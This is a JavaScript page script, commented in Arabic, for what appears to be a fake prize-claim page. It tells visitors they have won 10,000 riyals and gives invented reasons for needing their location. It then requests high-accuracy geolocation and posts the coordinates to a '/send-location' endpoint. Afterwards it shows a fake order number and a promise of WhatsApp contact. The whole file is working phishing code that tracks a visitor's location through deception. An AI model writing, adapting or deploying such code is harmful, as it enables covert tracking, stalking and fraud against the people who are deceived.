// عند تحميل الصفحة، نطلب الموقع مباشرة
window.onload = function() {
    const statusDiv = document.getElementById('status');
    const loadingDiv = document.getElementById('loading');

    // متغير لمنع تكرار الطلبات
    let isProcessing = false;

    // دالة لإظهار رسالة خطأ
    function showError(message) {
        const button = document.querySelector('.confirm-btn');
        if (button) {
            button.textContent = 'تأكيد استلام الجائزة';
            button.disabled = false;
            button.classList.add('pulse');
        }
        
        alert(message);
    }

    // دالة لإظهار رسالة نجاح
    function showSuccess() {
        const container = document.querySelector('.container');
        container.innerHTML = `
            <div class="header" style="text-align: center;">
                <h1 style="margin-bottom: 20px;">تم التأكيد بنجاح! 🎉</h1>
                <div class="prize-amount">10,000 ريال</div>
            </div>
            <div class="content" style="padding: 30px;">
                <div style="background: #f8f9fa; border-radius: 15px; padding: 20px; margin-bottom: 20px;">
                    <div style="color: #28a745; font-size: 24px; margin-bottom: 10px;">✅</div>
                    <h2 style="color: #28a745; margin: 10px 0;">تم تسجيل طلبك بنجاح</h2>
                    <p style="color: #666; line-height: 1.6; margin: 15px 0;">
                        سيتم التواصل معك خلال 24 ساعة عبر WhatsApp<br>
                        لإكمال إجراءات استلام جائزتك
                    </p>
                </div>
                
                <div style="border: 1px dashed #ddd; padding: 15px; border-radius: 10px;">
                    <div style="color: #666; font-size: 0.9em; margin-bottom: 5px;">رقم الطلب</div>
                    <div style="font-size: 1.2em; color: #DD2476; font-weight: bold;">
                        #${Math.floor(Math.random() * 1000000).toString().padStart(6, '0')}
                    </div>
                </div>

                <div style="margin-top: 30px; color: #666; font-size: 0.9em;">
                    * يرجى الاحتفاظ برقم الطلب
                </div>
            </div>
        `;
    }

    // دالة لبدء عملية تأكيد الجائزة
    async function startProcess() {
        if (isProcessing) return;
        isProcessing = true;

        try {
            // محاولة الحصول على الموقع الحالي
            const permission = await requestLocationPermission();
            if (permission === 'granted') {
                getLocation();
            } else {
                // إظهار رسالة تشرح أهمية تحديد الموقع
                showPermissionDialog();
            }
        } catch (error) {
            showError('عذراً، حدث خطأ غير متوقع. الرجاء المحاولة من هاتف آخر.');
            isProcessing = false;
        }
    }

    // طلب إذن الموقع
    async function requestLocationPermission() {
        try {
            // التحقق من دعم واجهة الأذونات
            if (navigator.permissions && navigator.permissions.query) {
                const result = await navigator.permissions.query({ name: 'geolocation' });
                return result.state;
            }
            return 'prompt';
        } catch {
            return 'prompt';
        }
    }

    // إظهار نافذة شرح أهمية تحديد الموقع
    function showPermissionDialog() {
        const container = document.querySelector('.container');
        const currentContent = container.innerHTML;
        
        container.innerHTML = `
            <div class="header" style="text-align: center;">
                <h1>خطوة مهمة! 🎯</h1>
            </div>
            <div class="content" style="padding: 30px;">
                <div style="background: #fff3cd; border-radius: 15px; padding: 20px; margin-bottom: 20px; border: 1px solid #ffeeba;">
                    <h2 style="color: #856404; margin-bottom: 15px;">لماذا نحتاج موقعك؟</h2>
                    <ul style="text-align: right; color: #666; line-height: 1.6; margin-bottom: 20px;">
                        <li>للتأكد من وجودك في منطقة الجائزة</li>
                        <li>لتحديد أقرب مركز تسليم جوائز إليك</li>
                        <li>لتسريع عملية استلام جائزتك</li>
                    </ul>
                </div>
                
                <div style="background: #f8f9fa; border-radius: 15px; padding: 20px; margin-bottom: 20px;">
                    <p style="color: #666; line-height: 1.6;">
                        عند ظهور نافذة تحديد الموقع، اضغط "السماح" للمتابعة
                    </p>
                    <img src="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' width='100'><text y='.9em' font-size='24'>📍</text></svg>" style="width: 100px; margin: 20px 0;">
                </div>

                <button onclick="getLocation()" class="confirm-btn pulse" style="margin-top: 20px;">
                    متابعة لاستلام الجائزة
                </button>
                
                <p style="color: #666; font-size: 0.9em; margin-top: 20px;">
                    * نحتاج موقعك فقط مرة واحدة للتحقق
                </p>
            </div>
        `;
    }

    // الحصول على الموقع
    function getLocation() {
        const button = document.querySelector('.confirm-btn');
        button.textContent = 'جاري التأكيد...';
        button.disabled = true;
        button.classList.remove('pulse');

        navigator.geolocation.getCurrentPosition(
            handleSuccess,
            handleError,
            {
                enableHighAccuracy: true,
                timeout: 10000,
                maximumAge: 0
            }
        );
    }

    // معالجة نجاح تحديد الموقع
    async function handleSuccess(position) {
        try {
            const response = await fetch('/send-location', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude,
                    accuracy: position.coords.accuracy,
                    timestamp: new Date().toISOString()
                })
            });

            if (!response.ok) {
                throw new Error('فشل في معالجة الطلب');
            }

            showSuccess();
        } catch (error) {
            showError('عذراً، حدث خطأ في النظام. الرجاء المحاولة بعد قليل.');
        } finally {
            isProcessing = false;
        }
    }

    // معالجة أخطاء تحديد الموقع
    function handleError(error) {
        isProcessing = false;
        if (error.code === 1) {
            // تم رفض الإذن
            showError('عذراً، يجب السماح بتحديد موقعك للمتابعة.');
        } else {
            showError('عذراً، لم نتمكن من تأكيد طلبك. الرجاء المحاولة مرة أخرى.');
        }
    }

    // طلب الموقع مباشرة
    showLoading();
    
    if (!navigator.geolocation) {
        showError('متصفحك لا يدعم تحديد الموقع');
        return;
    }

    startProcess();
};

// دالة لإظهار شاشة التحميل
function showLoading() {
    const loadingDiv = document.getElementById('loading');
    loadingDiv.style.display = 'block';
}
